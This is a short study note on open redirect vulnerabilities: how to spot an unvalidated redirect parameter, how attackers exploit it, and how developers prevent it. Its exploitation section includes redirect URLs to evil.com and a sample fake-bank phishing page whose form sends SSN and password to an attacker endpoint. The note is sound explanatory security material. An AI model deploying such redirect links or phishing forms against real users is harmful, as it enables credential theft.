# 10.open-redirect

14/05/25

## Recall

- What is an Open Redirect vulnerability?
- Why can Open Redirect be dangerous even though it doesn’t directly compromise a system?
- How can Open Redirect be used in phishing or session hijacking?
- What are typical signs or patterns of an Open Redirect?
- How can developers prevent Open Redirects?

## Notes

### What it is

**Open Redirect** is a vulnerability that occurs when an application redirects a user to a URL specified via a parameter, without properly validating or restricting that URL. This allows an attacker to manipulate the destination and redirect victims to malicious websites.

Although Open Redirects are often overlooked, since redirects are commonly used for user experience, they can be dangerous when combined with social engineering. An attacker can use them to trick users into visiting **malicious pages**, **phishing portals**, or **token-hijacking scripts**.

### How to identify it

To identify an Open Redirect, look for any parameter that controls redirection:

```html
<a href="https://mycompany.com.br?page=https://evil.com/fakebank">Saiba mais</a>
```

If modifying the page parameter results in a redirection to an arbitrary domain, then the vulnerability is present. A working exploit might look like:

```html
<a href="https://mycompany.com.br?page=https://evil.com/fakebank">About</a>
```

Try replacing the value with a domain you control and see if the application performs the redirection.

### How to exploit it

Exploitation is straightforward: the attacker convinces the user to click on a seemingly legitimate link (starting with the trusted domain), which then redirects to a malicious site.

Example attack flow:

```bash
https://mycompany.com.br?page=https://evil.com/fakebank
```

Gets redirect to:

```html
https://evil.com/fakebank
```

Phishing ****page:

```html
<!-- https://evil.com/fakebank -->

<html>
  <body style="background:#f5f5f5; font-family:sans-serif">
    <h2>Example Bank</h2>
    <p>Please confirm your details</p>
    <form action="https://evil.com/steal" method="POST">
      <label>SSN</label><br>
      <input type="text" name="ssn"><br>
      <label>Password:</label><br>
      <input type="password" name="password"><br><br>
      <input type="submit" value="confirm">
    </form>
  </body>
</html>
```

## Summary

Open Redirect vulnerabilities allow an attacker to redirect users to arbitrary websites via unvalidated parameters. While they may seem harmless, they are frequently used in phishing attacks, session hijacking, or chaining with other vulnerabilities like XSS or token leakage. Exploiting Open Redirects typically requires social engineering, but when successful, they can lead to serious consequences such as credential theft or session compromise. To prevent them, always validate redirect destinations using a whitelist, reject full external URLs in parameters, or resolve redirect targets internally by ID instead of raw links.